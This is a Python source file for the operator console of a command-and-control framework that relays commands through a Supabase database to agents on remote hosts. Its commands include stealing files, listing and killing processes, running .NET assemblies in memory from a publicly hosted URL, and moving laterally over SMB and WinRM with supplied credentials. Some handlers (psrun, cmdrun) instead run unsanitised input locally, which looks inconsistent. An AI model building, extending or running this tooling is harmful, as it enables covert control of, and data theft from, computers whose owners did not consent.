import time
import itertools
import os
import subprocess
import re
import threading

from .database import supabase, get_public_url
from .download import download_file
from .upload import upload_file

# Spinner for visual feedback
spinner = itertools.cycle(['|', '/', '-', '\\'])

# ANSI escape codes for colors
GREEN = '\033[32m'
RED = '\033[31m'
BLUE = '\033[34m'
RESET = '\033[0m'

def file_exists_in_supabase(bucket_name, storage_path):
    """Check if a file already exists in Supabase storage."""
    folder_path = os.path.dirname(storage_path)
    response = supabase.storage.from_(bucket_name).list(folder_path)
    if isinstance(response, list):
        for file in response:
            if file['name'] == os.path.basename(storage_path):
                return True
    return False

def check_for_completed_commands(command_id, hostname, printed_flag):
    """Check if a previously issued command has completed."""
    response = supabase.table('py2').select('status', 'output').eq('id', command_id).execute()
    command_info = response.data[0]
    if command_info['status'] in ('Completed', 'Failed'):
        if not printed_flag.is_set():
            output = command_info.get('output', 'No output available')
            if command_info['status'] == 'Failed':
                print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{hostname}{RESET}\n\n {output}")
            else:
                print(f"\n\n{BLUE}Output:{RESET} from {GREEN}{hostname}{RESET}\n\n {output}")
            printed_flag.set()
        return True
    return False

def background_check(command_id, hostname, completed_event, printed_flag):
    """Background thread to check for late responses."""
    while not completed_event.is_set():
        time.sleep(10)
        if check_for_completed_commands(command_id, hostname, printed_flag):
            completed_event.set()
            break

def send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval):
    """Interactively send commands to a host and print the output."""
    print(f"\nYou are now interacting with '{GREEN}{hostname}{RESET}'. Type 'exit' or 'help' for options.")
    print(f"Commands are being issued by user: {username}")

    while True:
        command_text = input("\nEnter a command to send: ").strip().lower()

        # Check for empty command
        if not command_text:
            print("Invalid command, please enter a command.")
            continue

        # Help command
        if command_text == 'help':
            print("\nAvailable Shortcut Commands:")
            for shortcut, command in command_mappings.items():
                print(f"  {shortcut:<10}               :: {command}")
            print("  sleep <number>                    :: Set a custom timeout (ex. sleep 5)")
            print("  download <file_path>              :: Download a file from the asset")
            print("  upload <local_path> <remote_path> :: Upload a file to the asset")
            print("  ps                                :: List all processes")
            print("  ps grep <pattern>                 :: Filter processes by name (Windows API)")
            print("  ps term <processid>               :: Terminate a process by its process ID")
            print("  run <path_to_remote_file>         :: Launch a process via Windows API")
            print("  psrun <path_to_remote_file>       :: Start a new process via Powershell")
            print("  cmdrun <path_to_remote_file>      :: Start a new process via cmd")
            print("  ls <directory_path>               :: List contents of a directory")
            print("  whoami                            :: Display user information (on Windows /all)")
            print("  pwd                               :: Display current working directory")
            print("  users <group_name>                :: List users in the specified group on Windows host via Windows API")
            print("  netexec <local_file> <arguments>  :: Run a .NET assembly in-memory")
            print("  smb write <local_file_path> <remote_smb_path> [username password domain]  :: Write a file to a remote host via SMB protocol")
            print("  smb get <remote_file_path> <local_file_path> [username password domain]  :: Get a file from a remote host via SMB protocol")
            print("  winrmexec <remote_host> <command> [username password domain]  :: Execute a command on a remote host via WinRM")
            print("  kill                              :: Terminate the agent")
            print("  exit                              :: Return to main menu\n")
            continue

        # Exit command
        if command_text == 'exit':
            print("Returning to the main menu.")
            break

        # Kill command
        if command_text == 'kill':
            print(f"Sending kill command to terminate {GREEN}{hostname}{RESET} agent.")
            command_text = "kill"  # ensure the command text is exactly "kill" to match agent's expectation

        # Download command
        if command_text.startswith("download"):
            try:
                parts = command_text.split(maxsplit=1)
                if len(parts) < 2:
                    print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                    continue
                _, file_path = parts
                download_file(hostname, file_path, username)
                continue
            except ValueError:
                print(f"{RED}Error:{RESET} Invalid download command format. Use 'download <file_path>'.")
                continue

        # Handle 'ps' command
        if command_text == 'ps':
            command_text = "ps"

        # Handle 'ps grep' command
        elif command_text.startswith('ps grep'):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print("Invalid ps grep command format. Use 'ps grep <pattern>'.")
                continue
            _, _, pattern = parts
            command_text = f"ps grep {pattern}"

        # Handle 'ps term' command
        elif command_text.startswith('ps term'):
            parts = command_text.split(maxsplit=2)
            if len(parts) < 3:
                print("Invalid ps term command format. Use 'ps term <processid>'.")
                continue
            _, _, process_id = parts
            if not process_id.isdigit():
                print("Invalid ps term command format. Process ID must be a number.")
                continue
            command_text = f"ps term {process_id}"

        # psrun command
        elif command_text.startswith("psrun "):
            try:
                _, command = command_text.split(maxsplit=1)
                subprocess.Popen(["powershell.exe", "-Command", f"Start-Process -FilePath '{command}'"])
                print(f"Started process: {command}")
                continue
            except ValueError:
                print("Invalid psrun command format. Use 'psrun <path_to_executable_or_file>'")
                continue

        # cmdrun command
        elif command_text.startswith("cmdrun "):
            try:
                _, command = command_text.split(maxsplit=1)
                subprocess.Popen(["cmd.exe", "/c", f"start {command}"])  # Use "/c" to close cmd after
                print(f"Started process: {command}")
                continue
            except ValueError:
                print("Invalid cmdrun command format. Use 'cmdrun <path_to_executable_or_file>'")
                continue

        # Handle the new 'ls' command
        elif command_text.startswith("ls"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                command_text = "ls ."  # Default to current directory if no path is provided
            else:
                command_text = f"ls {parts[1]}"

        # Handle the new 'whoami' command
        elif command_text == "whoami":
            command_text = "whoami"

        # Handle the new 'run' command
        elif command_text.startswith("run"):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 1:
                print(f"{RED}Error:{RESET} Invalid run command format. Use 'run <path_to_remote_file>'.")
                continue
            else:
                command_text = f"run {parts[1]}"

        # Handle the new 'users' command
        users_match = re.match(r'users\s+"([^"]+)"', command_text, re.IGNORECASE)
        if users_match:
            group_name = users_match.group(1)
            command_text = f'users "{group_name}"'
        elif command_text.lower().startswith("users "):
            parts = command_text.split(maxsplit=1)
            if len(parts) == 2:
                command_text = f"users {parts[1]}"
            else:
                print("Invalid users command format. Use 'users <group_name>'.")
                continue

        # Handle the new 'smb write' command
        elif command_text.startswith("smb write"):
            parts = command_text.split()
            if len(parts) < 4:
                print("Invalid smb write command format. Use 'smb write <local_file_path> <remote_smb_path> [username password domain]'.")
                continue
            local_file_path = parts[2]
            remote_smb_path = parts[3]
            if len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                command_text = f"smb write {local_file_path} {remote_smb_path} {username} {password} {domain}"
            else:
                command_text = f"smb write {local_file_path} {remote_smb_path}"

        # Handle the new 'smb get' command
        elif command_text.startswith("smb get"):
            parts = command_text.split()
            if len(parts) < 4:
                print("Invalid smb get command format. Use 'smb get <remote_file_path> <local_file_path> [username password domain]'.")
                continue
            remote_file_path = parts[2]
            local_file_path = parts[3]
            if len(parts) == 7:
                username, password, domain = parts[4], parts[5], parts[6]
                command_text = f"smb get {remote_file_path} {local_file_path} {username} {password} {domain}"
            else:
                command_text = f"smb get {remote_file_path} {local_file_path}"

        # Handle the new 'winrmexec' command
        elif command_text.startswith("winrmexec "):
            parts = command_text.split()
            if len(parts) < 3:
                print("Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'.")
                continue
            remote_host = parts[1]
            command = parts[2]
            if len(parts) == 6:
                username, password, domain = parts[3], parts[4], parts[5]
                command_text = f"winrmexec {remote_host} {command} {username} {password} {domain}"
            else:
                command_text = f"winrmexec {remote_host} {command}"

        # Handle the new 'netexec' command
        elif command_text.startswith("netexec "):
            try:
                _, local_file, *arguments = command_text.split(maxsplit=2)
                arguments = " ".join(arguments)  # Combine the arguments into a single string

                # Check if the file already exists in Supabase storage
                bucket_name = "files"
                filename = os.path.basename(local_file)
                storage_path = f"netexec/{filename}"

                if not file_exists_in_supabase(bucket_name, storage_path):
                    # Upload the file to Supabase
                    with open(local_file, 'rb') as f:
                        response = supabase.storage.from_(bucket_name).upload(storage_path, f)

                    print(f"File uploaded and available at: {get_public_url(bucket_name, storage_path)}")
                else:
                    print(f"File already exists at: {get_public_url(bucket_name, storage_path)}")

                # Send the netexec command to the agent
                file_url = get_public_url(bucket_name, storage_path)
                command_text = f"netexec {file_url} {arguments}"
            except Exception as e:
                print(f"{RED}Error:{RESET} {e}")
                continue

        # Translate using command mappings
        command_text = command_mappings.get(command_text, command_text)

        # Validate the winrmexec command before inserting it into the database
        if command_text.startswith("winrmexec"):
            parts = command_text.split()
            if len(parts) < 3:
                print(f"{RED}Error:{RESET} Invalid winrmexec command format. Use 'winrmexec <remote_host> <command> [username password domain]'.")
                continue

        # Handle the new 'pwd' command
        if command_text == "pwd":
            command_text = "pwd"

        # Sleep command with database update
        if command_text.startswith('sleep'):
            try:
                _, interval = command_text.split()
                current_sleep_interval = int(interval)
                print(f"Sleep interval set to {current_sleep_interval} seconds.")

                # Update the timeout_interval in the database for this host
                supabase.table("settings").update({
                    "timeout_interval": current_sleep_interval
                }).eq("hostname", hostname).execute()

                continue
            except (ValueError, IndexError):
                print("Invalid sleep command format. Use 'sleep <number>'.")
                continue

        # Upload command
        elif command_text.startswith("upload"):
            try:
                _, local_path, remote_path = command_text.split(maxsplit=2)
                upload_file(hostname, local_path, remote_path, username)
                continue
            except ValueError:
                print("Invalid upload command format. Use 'upload <local_path> <remote_path>'.")
                continue

        # Insert command into the database
        result = supabase.table('py2').insert({
            'hostname': hostname,
            'username': username,
            'command': command_text,
            'status': 'Pending'
        }).execute()

        if command_text == 'kill':
            print(f"Kill command sent to {hostname}. Shutting down.")
            continue  # Do not wait for a response, as the agent will terminate

        command_id = result.data[0]['id']
        print(f"Command '{command_text}' added with ID {command_id}.")
        print("Waiting for the command to complete...", end="", flush=True)

        completed_event = threading.Event()
        printed_flag = threading.Event()
        threading.Thread(target=background_check, args=(command_id, hostname, completed_event, printed_flag), daemon=True).start()

        first_pass = True
        start_time = time.time()  # Track the start time
        timeout_occurred = False
        while True:
            if completed_event.is_set():
                break

            if time.time() - start_time > 60:  # Check if 1 minute has passed
                print(f"\nCommand timeout. No response from {hostname} for 1 minute.")
                timeout_occurred = True
                break

            if not first_pass:  # Only show spinner after the first pass
                for _ in range(10):
                    print(next(spinner), end="\b", flush=True)
                    time.sleep(0.1)
            first_pass = False

            # Poll the database for command completion
            response = supabase.table('py2').select('status', 'output').eq('id', command_id).execute()
            command_info = response.data[0]

            # Check for command completion or failure
            if command_info['status'] in ('Completed', 'Failed'):
                completed_event.set()
                if not printed_flag.is_set():
                    output = command_info.get('output', 'No output available')
                    if command_info['status'] == 'Failed':
                        print(f"\n\n{RED}Error:{RESET} Command failed on {GREEN}{hostname}{RESET}\n\n {output}")
                    else:
                        print(f"\n\n{BLUE}Output:{RESET} from {GREEN}{hostname}{RESET}\n\n {output}")
                    printed_flag.set()
                break  # Exit loop when command is done

        # Print return to command prompt message only if timeout occurred
        if timeout_occurred:
            print(f"Returning to command prompt. You can check for command completion later.")
